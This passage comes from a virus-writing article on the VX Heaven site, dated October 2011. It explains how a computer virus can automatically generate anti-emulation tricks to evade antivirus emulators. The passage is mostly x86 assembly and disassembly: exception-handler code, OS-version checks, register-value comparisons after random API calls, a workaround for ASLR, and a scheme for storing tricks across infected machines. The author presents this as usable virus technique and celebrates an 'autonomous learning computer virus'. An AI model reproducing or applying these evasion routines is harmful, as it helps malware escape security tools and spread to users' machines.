&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;}</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; VEH_EXCEPTION RealRun2<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;{</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>s2ESP<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; restore ESP</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;}</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; VEH_END RealRun2<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>bException<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0x1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; ThisIsNoGoodAPI<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; if we are here, we have a good API with good parameters :)</span><br/>
&nbsp;</div>
<h3><a name="c34"></a>3.4) Creating Anti-Emulation Code</h3>
<p>We push the arguments, call the API and compare ECX and EDX APIs. However, as these leftover values we found are undefined, it is very likely that they are dependent on the OS version.</p>
<p>We can simply overcome the problem by calling GetVersion and comparing with the version-number where we found the Anti-Emulation trick.</p>
<p>The most simple implementation:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>GetVersion<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> OS_VERSION<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; StartCode &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; if we are on a different OS, we should</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; not perform the test, otherwise the code</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; may not be executed.</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; parameter1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; parameter2<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #339933;">...</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; parameterN<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; RandomAPI_Address<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> ECX_VALUE_FROM_TEST<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; ECX_OK<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ECX_OK<span style="color: #339933;">:</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> EDX_VALUE_FROM_TEST<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; EDX_OK<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; EDX_OK<span style="color: #339933;">:</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; StartCode<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; if we are here, we are most likely not emulated :)</span><br/>
&nbsp;</div>
<h3><a name="c35"></a>3.5) Examples: Autonomous generated Anti-Emulation Tricks</h3>
<p>Finally - let's have a look at the results!</p>
<p>That one uses kernel32.Beep:</p>
<pre>
00402000 > $ FF15 E0304000  CALL DWORD PTR DS:[&lt;&amp;KERNEL32.GetVersion>;  kernel32.GetVersion
00402006   . 3D 0501280A    CMP EAX,0A280105
0040200B   . 75 5F          JNZ SHORT ovilslmh.0040206C
0040200D   . 68 63F8D01F    PUSH 1FD0F863                            ; /Duration = 533788771. ms
00402012   . 68 601C3A77    PUSH 773A1C60                            ; |Frequency = 773A1C60 (2000297056.)
00402017   . E8 8B5A437C    CALL kernel32.Beep                       ; \Beep
0040201C   . 81F9 64FF0600  CMP ECX,6FF64
00402022   . 74 01          JE SHORT ovilslmh.00402025
00402024   . C3             RETN
00402025   > 81FA 14E5917C  CMP EDX,ntdll.KiFastSystemCallRet
0040202B   . 74 01          JE SHORT ovilslmh.0040202E
0040202D   . C3             RETN
0040202E   > 90             NOP
</pre>
<p>Here we have one with kernel32.WriteTapemark:</p>
<pre>
00402000 > $ FF15 E0304000  CALL DWORD PTR DS:[&lt;&amp;KERNEL32.GetVersion>;  kernel32.GetVersion
00402006   . 3D 0501280A    CMP EAX,0A280105
0040200B   . 75 5F          JNZ SHORT ijczijcj.0040206C
0040200D   . 68 B5A01E5E    PUSH 5E1EA0B5
00402012   . 68 4AC3FFA8    PUSH A8FFC34A
00402017   . 68 BBE2A2B7    PUSH B7A2E2BB
0040201C   . 68 D8B311A9    PUSH A911B3D8
00402021   . E8 A2A2467C    CALL kernel32.WriteTapemark
00402026   . 81F9 61F6917C  CMP ECX,7C91F661
0040202C   . 74 01          JE SHORT ijczijcj.0040202F
0040202E   . C3             RETN
0040202F   > 81FA 07000000  CMP EDX,7
00402035   . 74 01          JE SHORT ijczijcj.00402038
00402037   . C3             RETN
00402038   > 90             NOP
</pre>
<p>And the third one - kernel32.SetComPlusPackageInstallStatus:</p>
<pre>
00402000 > $ FF15 E0304000  CALL DWORD PTR DS:[&lt;&amp;KERNEL32.GetVersion>]                ;  kernel32.GetVersion
00402006   . 3D 0501280A    CMP EAX,0A280105
0040200B   . 75 5F          JNZ SHORT poxwpade.0040206C
0040200D   . 68 A0769B27    PUSH 279B76A0
00402012   . E8 8EAC467C    CALL kernel32.SetComPlusPackageInstallStatus
00402017   . 81F9 61F6917C  CMP ECX,7C91F661
0040201D   . 74 01          JE SHORT poxwpade.00402020
0040201F   . C3             RETN
00402020   > 81FA 00000000  CMP EDX,0
00402026   . 74 01          JE SHORT poxwpade.00402029
00402028   . C3             RETN
00402029   > 90             NOP
</pre>
<h3><a name="c36"></a>3.6) Working around ASLR</h3>
<p>ASLR means Address Space Layout Randomization, and has been introduced in Windows since WinVista. ASLR is used to make exploiting of vulnerabilities more difficult, by making addresses of libraries (and other things) random in memory.</p>
<p>This concerns us for two reasons:</p>
<ol>
<li>ECX or EDX can contain library addresses, which are different after next reboot.</li>
<li>The CALLs so far use fixed pointers to kernel32.dll functions.</li>
</ol>
<p>Both are very easy to solve: ad 1) At creation time, we compare ECX and EDX with kernel-addresse:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>RndFct_RV_ECX<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0xFF00</span><span style="color: #7f007f;">'0000<br/>
&nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ebx, dword[hKernel]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; and &nbsp; &nbsp; ebx, 0xFF00'</span><span style="color: #ff0000;">0000</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; NoECX_Kernel<br/>
&nbsp;</div>
<p>ad2) We use a different Anti-Emulator header, which gets its kernel32 addresse at runtime using LoadLibrary:</p>
<pre>
00402000 > $ FF15 E0304000  CALL DWORD PTR DS:[&lt;&amp;KERNEL32.GetVersion>;  kernel32.GetVersion
00402006   . 3D 0501280A    CMP EAX,0A280105
0040200B   . 75 6B          JNZ SHORT vencfwbe.00402078
0040200D   . 68 78104000    PUSH vencfwbe.00401078                   ; /FileName = "kernel32.dll"
00402012   . FF15 E4304000  CALL DWORD PTR DS:[&lt;&amp;KERNEL32.LoadLibrar>; \LoadLibraryA
00402018   . 05 271C0600    ADD EAX,61C27
0040201D   . 68 CC8DA293    PUSH 93A28DCC
00402022   . 68 15B832DB    PUSH DB32B815
00402027   . FFD0           CALL EAX
00402029   . 81FA 01000000  CMP EDX,1
0040202F   . 74 01          JE SHORT vencfwbe.00402032
00402031   . C3             RETN
</pre>
<p>ASLR is no way a problem for us -> Everything fine again :)</p>
<h2><a name="c4"></a>4) Possible extention: Remembering the tricks</h2>
<p>We saw how to autonomous develope new Anti-Emulation tricks. In this simple implementation, in every generation we overwrite the old code, thus "forget" about the old trick.</p>
<p>We can save the old trick, and merge it with new tricks. This has some nice advantages: When the virus runs at OS1,it creates and saves Trick1. Now it arrives at another computer with OS2, and creates Trick2. When it "remembers" the old trick, it can create a new Anti-Emulation code like this:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>GetVersion<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> OS_VERSION1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; NotOS1<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; OS1_Parameters<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; OS1_RandomAPI<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; ecx|edx<span style="color: #339933;">,</span> ECX1_VALUE|EDX1_VALUE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; StartCode<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; NotOS1<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> OS_VERSION2<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; NotOS2<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; OS2_Parameters<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; OS2_RandomAPI<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; ecx|edx<span style="color: #339933;">,</span> ECX2_VALUE|EDX2_VALUE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; StartCode<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #339933;">...</span><span style="color: black;">&#93;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; StartCode<span style="color: #339933;">:</span><br/>
&nbsp;</div>
<p>We can also save more than one Trick per OS. Then we can eigher use all of them directly in the code, or use a low number of them and save the other Tricks in .data section.</p>
<p>Advantage: When we travel from OS1 to OS2, and we have N Tricks saved, we can vary them even we dont have access to OS1 anymore. Varying is an advantage when we found broken tricks, and when AVs adapt.</p>
<p>Even it sounds fancy, it is pretty simple to code. :-)</p>
<h2><a name="c5"></a>5) Thought experiment: Are we learning?</h2>
<p>Let's have a look at Tom Mitchell's widely quoted definition of "learning":</p>
<blockquote>A computer program is said to learn from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T, as measured by P, improves with experience E.</blockquote>
<p>What are E, T and P in our case?</p>
<dl>
<dt>experience E</dt><dd>Blackbox analysis of a random API</dd>
<dt>task T</dt><dd>avoid being emulated</dd>
<dt>measure P</dt><dd>binary measure: being emulated or not</dd>
</dl>
<p>It seems very reasonable that the new developed Anti-Emulation tricks improve its ability of not being emulated.</p>
<p>So we have some autonomous learning computer virus. Wow - thats cool :-)</p>
<h2><a name="c6"></a>6) Conclusion</h2>
<p>We know now how a computer virus can analyse its environment and create new Anti-Emulation tricks - everything autonomous and very simple.</p>
<p>I've used the key technique - Blackbox Analysis - already in one other project (that time for finding new mutations)[3]; it seems like nobody else has ever thought about using this concept in viruses. Therefore I suspect that there are several other surprising possibilities that should be uncovered one day. :-)</p>
<div align="right">Second Part To Hell<br/>October 2011</div>
<ol>
<li>Gabor Szappanos, "Okay, so you are a Win32 emulator...", <a href="/vx.php?fid=2001#f2001">Virus Bulletin October 2011</a>.</li>
<li>Peter Ferrie, "Anti-Unpacker Tricks (1)", CARO Workshop, May 2008. Peter Ferrie, "Anti-Unpacker Tricks (2)", <a href="/vx.php?id=zv16">Virus Bulletin</a> December 2008 - June 2009. Peter Ferrie, "Anti-Unpacker Tricks (3)", <a href="/vx.php?id=zv16">Virus Bulletin</a> May 2010 - November 2010.</li>
<li>SPTH, "<a href="/lib/vsp27.html">Code Mutations via Behaviour Analysis</a>", <a href="/vx.php?fid=1940#f1940">Virus Writing Bulletin</a>, December 2010</li>
</ol>
[<a style="" href="/lib/?lang=EN&amp;index=WI#vsp42">Back to index</a>] [<a href="/lib/vsp42.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsp42">de</a><a href="/lib/index.php?lang=en&amp;id=vsp42">en</a><a href="/lib/index.php?lang=es&amp;id=vsp42">es</a><a href="/lib/index.php?lang=it&amp;id=vsp42">it</a><a href="/lib/index.php?lang=fr&amp;id=vsp42">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsp42">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsp42">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsp42">ua</a></div>
</body>
</html>
